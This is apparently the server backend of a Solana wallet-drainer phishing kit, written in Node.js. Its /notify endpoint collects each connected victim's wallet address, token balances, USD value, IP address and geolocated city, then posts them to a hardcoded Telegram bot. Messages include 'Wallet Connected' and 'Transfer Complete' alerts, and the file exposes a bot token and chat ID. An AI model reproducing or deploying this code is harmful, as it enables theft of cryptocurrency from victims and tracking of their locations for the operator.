const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================
// CONFIGURATION
// ============================================
const BOT_TOKEN = "8731239008:AAFr0vodZ-JYBExut1j7HNPRHWjZFMSQqHY";
const CHAT_ID = "8520547580";

let cachedSolPrice = null;
let lastPriceUpdate = 0;
const PRICE_CACHE_DURATION = 30 * 60 * 1000;

const TOKEN_SYMBOLS = {
    'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
    'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
    'So11111111111111111111111111111111111111112': 'SOL',
    'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'BONK',
    'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'mSOL',
    'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': 'jitoSOL'
};

// ============================================
// HELPER FUNCTIONS
// ============================================

function getCountryFlag(countryCode) {
    const flags = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
        'FR': '🇫🇷', 'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳', 'IN': '🇮🇳',
        'BR': '🇧🇷', 'RU': '🇷🇺', 'IT': '🇮🇹', 'ES': '🇪🇸', 'NL': '🇳🇱',
        'SE': '🇸🇪', 'NO': '🇳🇴', 'SG': '🇸🇬', 'CH': '🇨🇭', 'TR': '🇹🇷'
    };
    return flags[countryCode] || '🌍';
}

async function getIPLocation(ip) {
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 5000 });
        const data = response.data;
        if (data.status === 'success') {
            return {
                country: data.country,
                countryCode: data.countryCode,
                city: data.city,
                flag: getCountryFlag(data.countryCode)
            };
        }
    } catch (error) {
        console.error('IP geolocation error:', error.message);
    }
    return null;
}

async function getSolPrice() {
    const now = Date.now();
    
    if (cachedSolPrice && (now - lastPriceUpdate) < PRICE_CACHE_DURATION) {
        return cachedSolPrice;
    }
    
    try {
        const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd', { timeout: 10000 });
        cachedSolPrice = response.data.solana.usd;
        lastPriceUpdate = now;
        console.log(`SOL price: $${cachedSolPrice}`);
        return cachedSolPrice;
    } catch (error) {
        console.error('SOL price error:', error.message);
        return cachedSolPrice || 150;
    }
}

function escapeMarkdown(text) {
    if (!text) return '';
    return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
}

// ============================================
// TELEGRAM NOTIFICATION ENDPOINT
// ============================================

app.post('/notify', async (req, res) => {
    try {
        const { address, balance, walletType, customMessage, splTokens, ip } = req.body;
        
        // Get client IP
        let clientIP = ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        if (clientIP && clientIP.includes(',')) {
            clientIP = clientIP.split(',')[0].trim();
        }
        if (clientIP && clientIP.includes('::')) {
            clientIP = '127.0.0.1';
        }
        
        const [locationInfo, solPrice] = await Promise.all([
            getIPLocation(clientIP),
            getSolPrice()
        ]);
        
        const solBalance = parseFloat(balance) || 0;
        let totalUSD = solBalance * solPrice;
        let splTokensStr = '';
        
        if (splTokens && splTokens.length > 0) {
            splTokensStr = '\n💎 Tokens:\n';
            for (const token of splTokens) {
                const tokenValue = token.usdValue || 0;
                totalUSD += tokenValue;
                splTokensStr += `• ${token.symbol}: ${token.balance.toFixed(4)} ($${tokenValue.toFixed(2)})\n`;
            }
        }
        
        const shortAddress = address && address !== 'Unknown' ? 
            `${address.slice(0, 6)}...${address.slice(-4)}` : 'Unknown';
        const locationStr = locationInfo ? 
            `${locationInfo.flag} ${locationInfo.city || ''} ${locationInfo.country || ''}` : '🌍 Unknown';
        
        let text;
        if (customMessage) {
            if (customMessage.includes('🔗 Wallet Connected')) {
                text = `🔗 New Connection\n\n` +
                       `💰 Value: $${totalUSD.toFixed(2)}\n` +
                       `👛 Wallet: \`${escapeMarkdown(shortAddress)}\`\n` +
                       `🔄 Type: ${walletType || 'Unknown'}\n` +
                       `💎 SOL: ${balance} SOL ($${(solBalance * solPrice).toFixed(2)})${splTokensStr}\n` +
                       `📍 ${locationStr}\n` +
                       `🕒 ${new Date().toLocaleString()}`;
            } else if (customMessage.includes('🎉 Transfer Complete')) {
                text = `🎉 ${customMessage}\n\n` +
                       `👛 Wallet: \`${escapeMarkdown(shortAddress)}\`\n` +
                       `💰 Total: $${totalUSD.toFixed(2)}${splTokensStr}\n` +
                       `📍 ${locationStr}`;
            } else {
                text = `${customMessage}\n\n` +
                       `👛 Wallet: \`${escapeMarkdown(shortAddress)}\`\n` +
                       `📍 ${locationStr}`;
            }
        } else {
            text = `🔗 New Connection\n\n` +
                   `💰 Value: $${totalUSD.toFixed(2)}\n` +
                   `👛 Wallet: \`${escapeMarkdown(shortAddress)}\`\n` +
                   `💎 SOL: ${balance} SOL${splTokensStr}\n` +
                   `📍 ${locationStr}`;
        }
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });
        
        res.json({ ok: true });
    } catch (error) {
        console.error('Telegram error:', error.message);
        res.status(500).json({ error: "Notification failed" });
    }
});

// ============================================
// HEALTH CHECK
// ============================================

app.get('/health', (req, res) => {
    res.json({ status: 'ok', solPrice: cachedSolPrice });
});

// ============================================
// SERVER STARTUP
// ============================================

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    await getSolPrice();
    
    setInterval(async () => {
        await getSolPrice();
    }, PRICE_CACHE_DURATION);
});
